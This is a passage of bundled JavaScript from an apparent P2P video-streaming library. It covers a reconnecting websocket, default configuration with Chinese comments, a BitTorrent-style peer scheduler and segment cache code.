            emitError('EHOSTDOWN', 'Too many failed connection attempts');
            return;
        }
        if (!reconnectDelay) {
            reconnectDelay = initReconnectionDelay(config);
        } else {
            reconnectDelay = updateReconnectionDelay(config, reconnectDelay);
        }
        log('handleClose - reconnectDelay:', reconnectDelay);
        if (shouldRetry) {
            setTimeout(connect, reconnectDelay);
        }
    };
    var connect = function connect() {
        if (!shouldRetry) {
            return;
        }
        log('connect');
        var oldWs = ws;
        var wsUrl = typeof url === 'function' ? url() : url;
        ws = new config.constructor(wsUrl, protocols);
        connectingTimeout = setTimeout(function () {
            log('timeout');
            ws.close();
            emitError('ETIMEDOUT', 'Connection timeout');
        }, config.connectionTimeout);
        log('bypass properties');
        for (var key in ws) {
            // @todo move to constant
            if (['addEventListener', 'removeEventListener', 'close', 'send'].indexOf(key) < 0) {
                bypassProperty(ws, _this, key);
            }
        }
        ws.addEventListener('open', function () {
            clearTimeout(connectingTimeout);
            log('open');
            reconnectDelay = initReconnectionDelay(config);
            log('reconnectDelay:', reconnectDelay);
            retriesCount = 0;
        });
        ws.addEventListener('close', handleClose);
        reassignEventListeners(ws, oldWs, listeners);
        // because when closing with fastClose=true, it is saved and set to null to avoid double calls
        ws.onclose = ws.onclose || savedOnClose;
        savedOnClose = null;
    };
    log('init');
    connect();
    this.close = function (code, reason, _a) {
        if (code === void 0) {
            code = 1000;
        }
        if (reason === void 0) {
            reason = '';
        }
        var _b = _a === void 0 ? {} : _a,
            _c = _b.keepClosed,
            keepClosed = _c === void 0 ? false : _c,
            _d = _b.fastClose,
            fastClose = _d === void 0 ? true : _d,
            _e = _b.delay,
            delay = _e === void 0 ? 0 : _e;
        log('close - params:', { reason: reason, keepClosed: keepClosed, fastClose: fastClose, delay: delay, retriesCount: retriesCount, maxRetries: config.maxRetries });
        shouldRetry = !keepClosed && retriesCount <= config.maxRetries;
        if (delay) {
            reconnectDelay = delay;
        }
        ws.close(code, reason);
        if (fastClose) {
            var fakeCloseEvent_1 = {
                code: code,
                reason: reason,
                wasClean: true
            };
            // execute close listeners soon with a fake closeEvent
            // and remove them from the WS instance so they
            // don't get fired on the real close.
            handleClose();
            ws.removeEventListener('close', handleClose);
            // run and remove level2
            if (Array.isArray(listeners.close)) {
                listeners.close.forEach(function (_a) {
                    var listener = _a[0],
                        options = _a[1];
                    listener(fakeCloseEvent_1);
                    ws.removeEventListener('close', listener, options);
                });
            }
            // run and remove level0
            if (ws.onclose) {
                savedOnClose = ws.onclose;
                ws.onclose(fakeCloseEvent_1);
                ws.onclose = null;
            }
        }
    };
    this.send = function (data) {
        ws.send(data);
    };
    this.addEventListener = function (type, listener, options) {
        if (Array.isArray(listeners[type])) {
            if (!listeners[type].some(function (_a) {
                var l = _a[0];
                return l === listener;
            })) {
                listeners[type].push([listener, options]);
            }
        } else {
            listeners[type] = [[listener, options]];
        }
        ws.addEventListener(type, listener, options);
    };
    this.removeEventListener = function (type, listener, options) {
        if (Array.isArray(listeners[type])) {
            listeners[type] = listeners[type].filter(function (_a) {
                var l = _a[0];
                return l !== listener;
            });
        }
        ws.removeEventListener(type, listener, options);
    };
};
module.exports = ReconnectingWebsocket;

/***/ }),
/* 32 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
// import URLToolkit from 'url-toolkit';

//时间单位统一为秒
var commonConfig = {
    // wsSignalerAddr: 'wss://signal.cdnbye.com',          // 信令服务器地址
    wsMaxRetries: 10, // websocket连接重试次数

    p2pEnabled: true, // 是否开启P2P，默认true

    wifiOnly: false, // 是否只在wifi模式分享

    memoryCacheLimit: { // p2p缓存的最大数据量（分为PC和移动端）
        pc: 1024 * 1024 * 1024, // PC端缓存大小
        mobile: 1024 * 1024 * 512 // 移动端缓存大小
    },

    dcDownloadTimeout: 25, // p2p下载的最大超时时间

    logLevel: 'error', // log的level，分为debug、info、warn、error、none，设为true等于debug，设为false等于none，默认none

    tag: '', // 用户自定义标签

    webRTCConfig: {}, // 传入channelConfig用于createDataChannel，config用于RTCPeerConnection

    // useHttpRange: false,                          // 是否允许Http Range请求

    token: undefined, // electron专用token
    appName: undefined,
    appId: undefined,

    prefetchNum: 8, // 同时预下载的切片最大数量

    showSlogan: true, // 展示广告

    trickleICE: false,

    simultaneousTargetPeers: 2,

    announceLocation: 'cn'
};

/*
    fun: channelId generator
    streamId: 用于标识流地址的ID
    signalId: 用于标识信令地址的ID，在channelID加上这个可以防止不同信令服务器下的节点混在一起
 */
// commonConfig.channelId = function (url, browserInfo = {}) {
//     if (!url) {
//         throw new Error(`channelId parameter url is null`);
//     }
//     const streamParsed = URLToolkit.parseURL(url);
//     const streamId = streamParsed.netLoc.substr(2) + streamParsed.path.split('.')[0];
//     return `${streamId}`;
// };

// 对P2P方式下载的ts文件进行校验，返回值是true代表验证通过，否则不通过，默认true
commonConfig.validateSegment = function (segId, buffer) {
    // do nothing
    return true;
};

// 回调P2P统计信息
commonConfig.getStats = function (totalP2PDownloaded, totalP2PUploaded, totalHTTPDownloaded) {
    // do nothing
};

// 回调peerId
commonConfig.getPeerId = function (peerId) {
    // do nothing
};

// 回调peers info
commonConfig.getPeersInfo = function (peers) {
    // do nothing
};

exports.default = commonConfig;
module.exports = exports['default'];

/***/ }),
/* 33 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _events = __webpack_require__(1);

var _events2 = _interopRequireDefault(_events);

var _events3 = __webpack_require__(2);

var _events4 = _interopRequireDefault(_events3);

var _peerManager = __webpack_require__(17);

var _peerManager2 = _interopRequireDefault(_peerManager);

var _toolFuns = __webpack_require__(0);

var _requestingMap = __webpack_require__(34);

var _requestingMap2 = _interopRequireDefault(_requestingMap);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var CHECK_CONN_INTERVAL = 50; // 定时检查p2p连接 单位秒
var MAX_NO_EXCHANGE_TIME = 120; // 最大允许的无数据交换时间 单位秒

var _shareOnly = Symbol('shareOnly'); // 是否只上传不下载

var BtScheduler = function (_EventEmitter) {
    _inherits(BtScheduler, _EventEmitter);

    function BtScheduler(engine, config) {
        _classCallCheck(this, BtScheduler);

        var _this = _possibleConstructorReturn(this, (BtScheduler.__proto__ || Object.getPrototypeOf(BtScheduler)).call(this));

        _this.engine = engine;
        _this.config = config;
        _this.logger = engine.logger;

        _this.bitset = new Set(); // 本节点的bitfield  sn
        _this.bitCounts = new Map(); // 记录peers的每个buffer的总和 index -> count

        _this.bufMgr = null;
        _this.peerManager = new _peerManager2.default();
        _this.requestingMap = new _requestingMap2.default(); // 正在p2p下载的SN(segId)   sn(segId) -> [remotePeerIds]

        _this._setupEngine();

        _this.loadedPeerNum = 0; // 上次下载的peer的数量

        // 定时检查连接，超过5分钟没有数据交换则断开
        _this.startCheckConnsTimer();

        _this.dcDownloadTimeout = config.dcDownloadTimeout;

        _this[_shareOnly] = false;
        _this.downloadOnly = false;
        return _this;
    }

    _createClass(BtScheduler, [{
        key: 'startCheckConnsTimer',
        value: function startCheckConnsTimer() {
            var _this2 = this;

            this.checkConnsTimer = setInterval(function () {
                _this2.logger.info('start check conns');
                var peerNum = _this2.peersNum;
                var subscribers = _this2.subscribers;
                var children = subscribers && subscribers.length > 0 ? subscribers.length : undefined;
                var _iteratorNormalCompletion = true;
                var _didIteratorError = false;
                var _iteratorError = undefined;

                try {
                    for (var _iterator = _this2.peerManager.getPeerValues()[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
                        var peer = _step.value;

                        if (peer.connected) {
                            // 发送统计信息
                            peer.sendMsgStats(peerNum, children);
                        }
                    }
                } catch (err) {
                    _didIteratorError = true;
                    _iteratorError = err;
                } finally {
                    try {
                        if (!_iteratorNormalCompletion && _iterator.return) {
                            _iterator.return();
                        }
                    } finally {
                        if (_didIteratorError) {
                            throw _iteratorError;
                        }
                    }
                }
            }, CHECK_CONN_INTERVAL * 1000);
        }
    }, {
        key: 'getNonactivePeers',
        value: function getNonactivePeers() {
            var currentTs = (0, _toolFuns.getCurrentTs)();
            var candidates = [];
            var _iteratorNormalCompletion2 = true;
            var _didIteratorError2 = false;
            var _iteratorError2 = undefined;

            try {
                for (var _iterator2 = this.peerManager.getPeerValues()[Symbol.iterator](), _step2; !(_iteratorNormalCompletion2 = (_step2 = _iterator2.next()).done); _iteratorNormalCompletion2 = true) {
                    var peer = _step2.value;

                    var duration = currentTs - peer.dataExchangeTs;
                    if (duration > MAX_NO_EXCHANGE_TIME) {
                        candidates.push(peer);
                    }
                }
            } catch (err) {
                _didIteratorError2 = true;
                _iteratorError2 = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion2 && _iterator2.return) {
                        _iterator2.return();
                    }
                } finally {
                    if (_didIteratorError2) {
                        throw _iteratorError2;
                    }
                }
            }

            if (candidates.length > 0) {
                candidates.sort(function (a, b) {
                    return a.dataExchangeTs - b.dataExchangeTs;
                });
            }
            return candidates;
        }

        // 从peer获取节点

    }, {
        key: 'requestPeers',
        value: function requestPeers() {
            this.logger.info('request peers from peers');
            var msg = {
                event: _events4.default.DC_GET_PEERS
            };
            this._broadcastToPeers(msg);
        }

        // 阻止其它peer的请求

    }, {
        key: 'chokePeerRequest',
        value: function chokePeerRequest(dc) {
            var msg = {
                event: _events4.default.DC_CHOKE
            };
            if (dc) {
                dc.sendJson(msg);
            } else {
                this._broadcastToPeers(msg);
            }
        }

        // 允许其它peer的请求

    }, {
        key: 'unchokePeerRequest',
        value: function unchokePeerRequest(dc) {
            var msg = {
                event: _events4.default.DC_UNCHOKE
            };
            if (dc) {
                dc.sendJson(msg);
            } else {
                this._broadcastToPeers(msg);
            }
        }

        // 暂停从其它peer请求数据

    }, {
        key: 'stopRequestFromPeers',
        value: function stopRequestFromPeers() {
            var _iteratorNormalCompletion3 = true;
            var _didIteratorError3 = false;
            var _iteratorError3 = undefined;

            try {
                for (var _iterator3 = this.peerManager.getPeerValues()[Symbol.iterator](), _step3; !(_iteratorNormalCompletion3 = (_step3 = _iterator3.next()).done); _iteratorNormalCompletion3 = true) {
                    var peer = _step3.value;

                    peer.choked = true;
                }
            } catch (err) {
                _didIteratorError3 = true;
                _iteratorError3 = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion3 && _iterator3.return) {
                        _iterator3.return();
                    }
                } finally {
                    if (_didIteratorError3) {
                        throw _iteratorError3;
                    }
                }
            }
        }

        // 恢复从其它peer请求数据

    }, {
        key: 'resumeRequestFromPeers',
        value: function resumeRequestFromPeers() {
            var _iteratorNormalCompletion4 = true;
            var _didIteratorError4 = false;
            var _iteratorError4 = undefined;

            try {
                for (var _iterator4 = this.peerManager.getPeerValues()[Symbol.iterator](), _step4; !(_iteratorNormalCompletion4 = (_step4 = _iterator4.next()).done); _iteratorNormalCompletion4 = true) {
                    var peer = _step4.value;

                    peer.choked = false;
                }
            } catch (err) {
                _didIteratorError4 = true;
                _iteratorError4 = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion4 && _iterator4.return) {
                        _iterator4.return();
                    }
                } finally {
                    if (_didIteratorError4) {
                        throw _iteratorError4;
                    }
                }
            }
        }

        // 设置shareOnly

    }, {
        key: 'setShareOnly',
        value: function setShareOnly() {
            this[_shareOnly] = true;
        }
    }, {
        key: 'deletePeer',
        value: function deletePeer(dc) {
            if (this.peerManager.hasPeer(dc.remotePeerId)) {
                this.peerManager.removePeer(dc.remotePeerId);
            }
            // this.engine.emit('peers', [...this.peerMap.keys()]);
            this._peersStats(this.peerManager.getPeerIds());
        }
    }, {
        key: 'handshakePeer',
        value: function handshakePeer(dc) {
            this._setupDC(dc);
            dc.sendMetaData(Array.from(this.bitset), this.sequential, this.peersNum); //向peer发送bitfield
        }
    }, {
        key: 'getPeers',
        value: function getPeers() {
            return [].concat(_toConsumableArray(this.peerManager.getPeerValues()));
        }
    }, {
        key: 'addPeer',
        value: function addPeer(peer) {
            var logger = this.logger;

            this.peerManager.addPeer(peer.remotePeerId, peer);

            if (this[_shareOnly]) {
                peer.choked = true;
            }

            // this.engine.emit('peers', [...this.peerMap.keys()]);
            var peerIds = this.peerManager.getPeerIds();
            this._peersStats(peerIds);
            logger.info('add peer ' + peer.remotePeerId + ', now has ' + peerIds.length + ' peers');
            if (peer.isInitiator && this.peersNum <= 5 && peer.peersConnected > 1) {
                // 立即请求节点
                peer.sendPeersRequest();
            }
        }
    }, {
        key: 'peersHas',
        value: function peersHas(id) {
            return this.bitCounts.has(id);
        }
    }, {
        key: 'onBufferManagerSegAdded',
        value: function onBufferManagerSegAdded(seg) {}
    }, {
        key: 'destroy',
        value: function destroy() {
            var logger = this.logger;

            if (this.peersNum > 0) {
                // for (let peer of this.peerMap.values()) {
                //     peer.destroy();
                //     peer = null;
                // }
                this.peerManager.clear();
            }
            this.removeAllListeners();

            clearInterval(this.checkConnsTimer);
            this.engine = null;
            logger.warn('destroy BtScheduler');
        }
    }, {
        key: 'notifyPeersLoaded',
        value: function notifyPeersLoaded(num) {
            // void
        }
    }, {
        key: 'handleMetaData',
        value: function handleMetaData(dc, msg) {
            var _this3 = this;

            // console.warn(`bt DC_METADATA`);
            if (!msg.field) return;
            dc.bitset = new Set(msg.field);
            msg.field.forEach(function (value) {
                if (!_this3.bitset.has(value)) {
                    //防止重复下载
                    _this3._increBitCounts(value);
                }
            });
            this.addPeer(dc); //只有获取bitfield之后才加入peerMap
            if (this.downloadOnly) {
                // console.warn("choke peer");
                this.chokePeerRequest(dc); // 不分享
            }
        }
    }, {
        key: '_setupDC',
        value: function _setupDC(dc) {
            var _this4 = this;

            // console.warn(`bt scheduler _setupDC`);
            var logger = this.logger;

            dc
            // .once(Events.DC_METADATA, msg => {
            //     this.handleMetaData(dc, msg);
            // })
            .on(_events4.default.DC_PIECE_ACK, function (msg) {
                if (msg.size) {
                    _this4.engine.fetcher.reportUploaded(msg.size);
                }
                logger.info('uploaded ' + msg.seg_id + ' to ' + dc.remotePeerId);
            }).on(_events4.default.DC_TIMEOUT, function (sn) {}).on(_events4.default.DC_PIECE_ABORT, function (msg) {
                logger.warn('peer ' + dc.remotePeerId + ' download aborted, reason ' + msg.reason);
                if (dc.downloading) _this4._handlePieceAborted(dc.remotePeerId);
                dc.downloading = false;
            });
        }
    }, {
        key: '_broadcastToPeers',
        value: function _broadcastToPeers(msg) {
            var _iteratorNormalCompletion5 = true;
            var _didIteratorError5 = false;
            var _iteratorError5 = undefined;

            try {
                for (var _iterator5 = this.peerManager.getPeerValues()[Symbol.iterator](), _step5; !(_iteratorNormalCompletion5 = (_step5 = _iterator5.next()).done); _iteratorNormalCompletion5 = true) {
                    var peer = _step5.value;

                    peer.sendJson(msg);
                }
            } catch (err) {
                _didIteratorError5 = true;
                _iteratorError5 = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion5 && _iterator5.return) {
                        _iterator5.return();
                    }
                } finally {
                    if (_didIteratorError5) {
                        throw _iteratorError5;
                    }
                }
            }
        }
    }, {
        key: '_getIdlePeer',
        value: function _getIdlePeer() {
            return this.peerManager.getAvailablePeers();
        }
    }, {
        key: '_peersStats',
        value: function _peersStats(peers) {
            this.engine.emit('peers', peers);
            var getPeersInfo = this.engine.config.getPeersInfo;
            if (getPeersInfo && typeof getPeersInfo === 'function') {
                getPeersInfo(peers);
            }
        }
    }, {
        key: '_decreBitCounts',
        value: function _decreBitCounts(id) {
            if (this.bitCounts.has(id)) {
                var last = this.bitCounts.get(id);
                if (last === 1) {
                    this.bitCounts.delete(id);
                } else {
                    this.bitCounts.set(id, last - 1);
                }
            }
        }
    }, {
        key: '_increBitCounts',
        value: function _increBitCounts(index) {
            if (!this.bitCounts.has(index)) {
                this.bitCounts.set(index, 1);
            } else {
                var last = this.bitCounts.get(index);
                this.bitCounts.set(index, last + 1);
            }
        }
    }, {
        key: 'reportDCTraffic',
        value: function reportDCTraffic(id, size, speed) {
            if (!this.engine.fetcher) {
                this.logger.error("DC report failed");
                return;
            }
            var fetcher = this.engine.fetcher;

            var traffic = size;
            // console.warn(`reportDCTraffic origin ${traffic}`);

            if (this.bitset.has(id)) {
                // 已经有了，流量乘以0.5
                // traffic *= 0.5;
                return;
            }

            // console.warn(`reportDCTraffic actual ${traffic} speed ${speed}`);
            fetcher.reportDCTraffic(traffic, speed);
        }
    }, {
        key: 'cleanRequestingMap',
        value: function cleanRequestingMap(peerIdToDelete) {
            var peer = this.peerManager.getPeer(peerIdToDelete);
            var _iteratorNormalCompletion6 = true;
            var _didIteratorError6 = false;
            var _iteratorError6 = undefined;

            try {
                for (var _iterator6 = this.requestingMap.internalMap[Symbol.iterator](), _step6; !(_iteratorNormalCompletion6 = (_step6 = _iterator6.next()).done); _iteratorNormalCompletion6 = true) {
                    var _step6$value = _slicedToArray(_step6.value, 2),
                        id = _step6$value[0],
                        targetIds = _step6$value[1];

                    if (targetIds && targetIds.includes(peerIdToDelete)) {
                        this.logger.info('delete ' + id + ' in requestingMap');
                        this.requestingMap.delete(id);
                        this._decreBitCounts(id);
                        // TODO 验证 删除bitset
                        if (peer) peer.bitset.delete(id);
                    }
                }
            } catch (err) {
                _didIteratorError6 = true;
                _iteratorError6 = err;
            } finally {
                try {
                    if (!_iteratorNormalCompletion6 && _iterator6.return) {
                        _iterator6.return();
                    }
                } finally {
                    if (_didIteratorError6) {
                        throw _iteratorError6;
                    }
                }
            }
        }
    }, {
        key: 'getPeerLoadedMore',
        value: function getPeerLoadedMore(id) {
            if (!this.requestingMap.has(id)) return null;
            var arr = this.requestingMap.getAllPeerIds(id);
            if (arr.length === 0) return null;
            var target = this.peerManager.getPeer(arr[0]);
            // console.warn(`target.segId ${target.segId} id ${id}`);
            if (!target) return null;
            if (arr.length > 1) {
                for (var i = 1; i < arr.length; i++) {
                    var candidate = this.peerManager.getPeer(arr[i]);
                    if (candidate && candidate.bufArr.length > target.bufArr.length) {
                        target = candidate;
                    }
                }
            }
            return target;
        }
    }, {
        key: 'hasPeers',
        get: function get() {
            return this.peersNum > 0;
        }
    }, {
        key: 'peersNum',
        get: function get() {
            return this.peerManager.size();
        }
    }, {
        key: 'hasIdlePeers',
        get: function get() {
            var idles = this._getIdlePeer().length;
            this.logger.info('peers: ' + this.peersNum + ' idle peers: ' + idles);
            return idles > 0;
        }
    }, {
        key: 'bufferManager',
        set: function set(bm) {
            var _this5 = this;

            this.bufMgr = bm;
            bm.on(_events4.default.BM_LOST, function (sn, segId, next) {
                // this.logger.debug(`bufMgr lost ${sn} segId ${segId} next ${next}`);
                if (!_this5.config.live) {
                    _this5._broadcastToPeers({ //点播模式下向peers广播已经不缓存的sn
                        event: _events4.default.DC_LOST,
                        sn: sn,
                        seg_id: segId
                    });
                }
                _this5.onBufferManagerLost(sn, segId, next);
            }).on(_events4.default.BM_SEG_ADDED, function (seg) {
                _this5.onBufferManagerSegAdded(seg);
            });
        }
    }]);

    return BtScheduler;
}(_events2.default);

exports.default = BtScheduler;
module.exports = exports['default'];

/***/ }),
/* 34 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var RequestingMap = function () {
    function RequestingMap() {
        _classCallCheck(this, RequestingMap);

        this.internalMap = new Map(); // 正在p2p下载的SN(segId)   sn(segId) -> remotePeerIds
    }

    _createClass(RequestingMap, [{
        key: "has",
        value: function has(id) {
            return this.internalMap.has(id);
        }
    }, {
        key: "set",
        value: function set(id, peerId) {
            // console.warn(`RequestingMap set ${peerId} for ${id}`);
            if (this.internalMap.has(id)) {
                var arr = this.internalMap.get(id);
                if (arr) {
                    arr.push(peerId);
                    return;
                }
            }
            this.internalMap.set(id, [peerId]);
        }
    }, {
        key: "setPeerUnknown",
        value: function setPeerUnknown(id) {
            this.internalMap.set(id, null);
        }
    }, {
        key: "checkIfPeerUnknown",
        value: function checkIfPeerUnknown(id) {
            return this.internalMap.has(id) && !this.internalMap.get(id);
        }
    }, {
        key: "getAllPeerIds",
        value: function getAllPeerIds(id) {
            var ret = this.internalMap.get(id);
            if (!ret) return [];
            return ret;
        }
    }, {
        key: "getOnePeerId",
        value: function getOnePeerId(id) {
            if (this.internalMap.has(id)) {
                var arr = this.internalMap.get(id);
                if (arr) return this.internalMap.get(id)[0];
            }
            return null;
        }
    }, {
        key: "delete",
        value: function _delete(id) {
            this.internalMap.delete(id);
        }
    }]);

    return RequestingMap;
}();

exports.default = RequestingMap;
module.exports = exports["default"];

/***/ }),
/* 35 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _events = __webpack_require__(1);

var _events2 = _interopRequireDefault(_events);

var _events3 = __webpack_require__(2);

var _events4 = _interopRequireDefault(_events3);

var _platform = __webpack_require__(4);

var _platform2 = _interopRequireDefault(_platform);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var LIVE_MAX_BUFFER_SIZE = 1024 * 1024 * 35; // 直播模式的最大缓存大小
// const LIVE_MAX_BUFFER_SIZE = 1024*1024*2;        // 直播模式的最大缓存大小       test

var MIN_SEGMENTS_KEEP = 5; // 最少保留多少个segment

var SegmentCache = function (_EventEmitter) {
    _inherits(SegmentCache, _EventEmitter);

    function SegmentCache(engine, config) {
        var isSequential = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : true;

        _classCallCheck(this, SegmentCache);

        var _this = _possibleConstructorReturn(this, (SegmentCache.__proto__ || Object.getPrototypeOf(SegmentCache)).call(this));

        _this.isSequential = isSequential;
        // this.engine = engine;
        _this.logger = config.logger;

        var device = engine.browserInfo.device;
        _this.maxBufSize = device === _platform2.default.device.PC_WEB || device === _platform2.default.device.PC_NATIVE ? config.memoryCacheLimit.pc : config.memoryCacheLimit.mobile;
        if (config.live) _this.maxBufSize = LIVE_MAX_BUFFER_SIZE;
        /* segment
        sn: number
        segId: string
        data: Buffer
        size: string
        fromPeerId: string
         */
        _this._segPool = new Map(); //存放seg的Map            segId (sn) -> segment
        _this._currBufSize = 0; //目前的buffer总大小
        _this.id2Sn = new Map(); //以segId查找sn      segId -> sn
        _this.overflowed = false; //缓存是否已满
        return _this;
    }

    _createClass(SegmentCache, [{
        key: 'hasSegOfId',
        value: function hasSegOfId(segId) {
            //防止重复加入seg
            if (this.isSequential) {
                var sn = this.id2Sn.get(segId);
                return this._segPool.has(sn);
            }
            return this._segPool.has(segId);
        }
    }, {
        key: 'hasSegOfSN',
        value: function hasSegOfSN(sn) {
            if (this.isSequential) {
                return this._segPool.has(sn);
            }
            return false;
        }
    }, {
        key: '_calSegPoolSize',
        value: function _calSegPoolSize() {
            var totalSize = 0;
            this._segPool.forEach(function (seg) {
                totalSize += seg.size;
            });
            return totalSize;
        }
    }, {
        key: 'putSeg',
        value: function putSeg(segment) {
            if (this._currBufSize >= this.maxBufSize * 1.5) {
                this._currBufSize = this._calSegPoolSize();
                if (this._currBufSize >= this.maxBufSize * 1.5) {
                    this.clear();
                    this.overflowed = false;
                }
            }

            if (this.isSequential) {
                if (this._segPool.has(segment.sn)) return;
                this._addSequentialSeg(segment);
            } else {
                if (this._segPool.has(segment.segId)) return;
                this._addUnsequentialSeg(segment);
            }
        }
    }, {
        key: '_addSequentialSeg',
        value: function _addSequentialSeg(seg) {
            var logger = this.logger;
            var segId = seg.segId,
                sn = seg.sn,
                size = seg.size;

            this.id2Sn.set(segId, sn);
            this._segPool.set(sn, seg);
            this._currBufSize += parseInt(size);

            var poolSize = this._segPool.size;
            // logger.info(`segment pool add seg ${sn} size ${size} currBufSize ${this._currBufSize} cacheLimit ${this.maxBufSize} poolSize ${poolSize}`);

            this.emit('' + _events4.default.BM_ADDED_SN_ + seg.sn, seg);
            this.emit(_events4.default.BM_SEG_ADDED, seg);

            if (this._currBufSize < this.maxBufSize || poolSize <= MIN_SEGMENTS_KEEP) return;

            // console.warn(Array.from(this._segPool.keys()).sort((a, b) => a-b));
            var sorted = Array.from(this._segPool.keys()).sort(function (a, b) {
                return a - b;
            }); // 从小到大排序
            var count = 0;
            do {
                if (count++ > 10) {
                    console.error('too much loops in SegmentCache');
                    break;
                }
                // 释放溢出的buffer
                var oldestSN = sorted.shift();
                if (oldestSN === undefined) {
                    logger.error('lastSN not found');
                    continue;
                }
                var nextSN = sorted[0];
                var oldestSeg = this._segPool.get(oldestSN);
                if (!oldestSeg) {
                    logger.error('lastSeg not found');
                    continue;
                }
                var _size = oldestSeg.size;
                this._currBufSize -= parseInt(_size);
                this._segPool.delete(oldestSN);
                this.id2Sn.delete(oldestSeg.segId);
                logger.info('pop seg ' + oldestSN + ' size ' + _size + ' currBufSize ' + this._currBufSize);
                if (!this.overflowed) this.overflowed = true;
                this.emit(_events4.default.BM_LOST, oldestSN, oldestSeg.segId, nextSN);
            } while (this._currBufSize >= this.maxBufSize && this._segPool.size > MIN_SEGMENTS_KEEP);
        }
    }, {
        key: '_addUnsequentialSeg',
        value: function _addUnsequentialSeg(seg) {
            var logger = this.logger;
            var segId = seg.segId,
                size = seg.size;

            this._segPool.set(segId, seg);
            this._currBufSize += parseInt(size);
            // logger.info(`segment pool add seg ${segId} size ${size} currBufSize ${this._currBufSize} cacheLimit ${this.maxBufSize}`);

            this.emit('' + _events4.default.BM_ADDED_SEG_ + seg.segId, seg);
            this.emit(_events4.default.BM_SEG_ADDED, seg);

            // 没有序号
            var count = 0;
            while (this._currBufSize >= this.maxBufSize && this._segPool.size > MIN_SEGMENTS_KEEP) {
                // 释放溢出的buffer
                if (count++ > 10) {
                    console.error('too much loops in SegmentCache');
                    break;
                }
                // console.warn([...this._segPool.values()]);
                var oldestSeg = [].concat(_toConsumableArray(this._segPool.values())).shift();
                var oldestSegId = oldestSeg.segId;
                var _size2 = oldestSeg.size;
                this._currBufSize -= parseInt(_size2);
                logger.info('pop seg ' + oldestSegId + ' size ' + _size2);
                this._segPool.delete(oldestSegId);
                if (!this.overflowed) this.overflowed = true;
                this.emit(_events4.default.BM_LOST, -1, oldestSegId);
            }
        }
    }, {
        key: 'getSegById',
        value: function getSegById(segId) {
            if (this.isSequential) {
                var sn = this.id2Sn.get(segId);
